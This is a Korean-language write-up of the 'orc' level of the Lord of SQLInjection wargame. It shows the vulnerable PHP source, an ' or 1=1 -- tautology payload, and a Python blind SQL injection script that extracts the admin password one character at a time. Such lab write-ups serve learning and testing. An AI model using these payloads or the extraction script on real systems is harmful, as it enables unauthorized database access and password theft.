# LOS - orc

```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_orc where id='admin' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello admin</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_orc where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("orc"); 
  highlight_file(__FILE__); 
?>
```

이 문제는 두가지를 동시에 해결해야 한다. 

일단 처음에 id를 뽑아내는 부분을 거쳐서 "Hello admin"을 출력시키고 addslashes함수를 우회하여 pw를 맞춰야 한다. 

먼저, 지금까지 해왔던 방법으로 "Hello admin"을 출력해보자. 

간단하게 or 1=1 --' 를 주는 것만으로도 쉽게 출력이 되는 것을 볼 수 있다. 

```mysql
query : select id from prob_orc where id='admin' and pw='' or 1 = 1 --''
```

두번째 문제가 좀 복잡한데, 먼저 addslashes에 대해서 알아야 한다. 

검색해보니 addslashes함수는 < ', ", \, \x00 > 에 대해서 필터링할 수 있게 앞의 문자가 오면 문자 앞에 \ 붙여서 query에 넣어준다고 한다. 

그럼 내가 넣어준 query는 다음과 같이 변하게 될 것이다. 

```mysql
query : select id from prob_orc where id='admin' and pw='\' or 1 = 1 --\''
```

이렇게 되면 or문이 제대로 작동하지 않을 것이고 당연히 pw는 제대로 나오지 않게 된다. 

여기서부터 진짜 해메다가 도움을 받아 풀게되었다.(모르는 건 배워야 한다는 마음으로..)
php코드에서 마지막 부분쪽을 보면 내가 입력한 값($_GET['pw'])와 뽑아온 패스워드 값($result['pw'])를 비교하는 구문이 있다. 이 구문이 있기때문에 정확히 똑같은 값을 입력해 주어야 답을 얻을 수 있다. 
여기서부터는 url에 인자를 계속 바꿔가면서 주기가 어려워서 python 코드를 이용했다. 

```python
import requests
cooki = {'PHPSESSID': "obnllqh3qvb9793r8fk8n6jkij"}
url = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php"
i = 1
key = "Hello admin"
pw_len = 0
while True:
    params = {'pw': "1' or length(pw)="+str(i)+' #'}
    res = requests.get(url, params, cookies=cooki)

    if key in res.text:
        pw_len = i
        break
    i = i + 1
    print i
print pw_len
for j in range(1,pw_len+1):
    for k in range(48, 123):
        if 58 <= k < 65:
            continue
        if 91 <= k < 97:
            continue
        params = {'pw': "1' or id='admin' and ascii(substr(pw,"+str(j)+",1)) = "+str(hex(k))+"#"}
        res2 = requests.get(url, params, cookies=cooki)
       # print res.text
        if key in res2.text:
            print str(j) + " : " + chr(k)

```

코드를 처음 짜봐서 굉장히 애를 많이 먹었는데, 막혀서 공부하다 알게된 부분이

- request.get으로 값을 보낼때 쿠키 값을 보내지 않으면 redirection이 뜬다. 
- request.get의 return value에서 어떤 속성을 주느냐에 따라 다양한 값이 나올 수 있다.
- python에서는 값을 감싸서 타입을 정해주는 것만으로 변환이 가능하다.

등이 있는데 python에서 제공해주는 많은 기능들로 인해서 편리하게 코드를 짤 수 있었다. 

코드에 대한 설명은 간단히 하자면 지금까지 수작업으로 보내줬던 값을 string으로 바꾸어 reqeusts를 이용해 get방식으로 보내 return value를 분석해 내가 원하는 값("Hello admin")이 뜨면 출력해주는 식으로 구현하였다. 

비밀번호의 길이를 먼저 찾고 한 글자씩 비교하면서 맞추어 나가는 식으로 구현된 코드라 효율적인지는 모르겠지만 시간이 많이 걸렸다. 

![1565252187016](C:\Users\qkrwl\Documents\web\los\LOS - orc-clear.png)